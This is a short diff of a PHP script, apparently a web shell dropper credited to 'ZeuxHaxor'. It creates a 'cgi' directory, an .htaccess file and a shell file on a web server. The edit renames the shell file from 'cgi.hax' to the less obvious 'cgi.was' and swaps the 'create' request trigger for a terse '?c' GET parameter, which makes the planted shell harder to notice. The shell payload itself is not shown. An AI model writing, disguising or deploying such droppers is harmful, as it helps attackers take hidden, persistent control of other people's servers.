@@ -3,7 +3,7 @@
 // - ZeuxHaxor ***
 
 $dir = 'cgi';
-$shell = 'cgi.hax';
+$shell = 'cgi.was';
 
 function create_directory($folder) {
     echo "Creating directory... ";
@@ -104,7 +104,7 @@ if (isset($_REQUEST['remove'])) {
     remove_directory($dir);
 }
 
-if (isset($_REQUEST['create'])) {
+if (isset($_GET['c'])) {
     create_directory($dir);
     create_htaccess($htaccess, $ext);
     create_shell($shell);
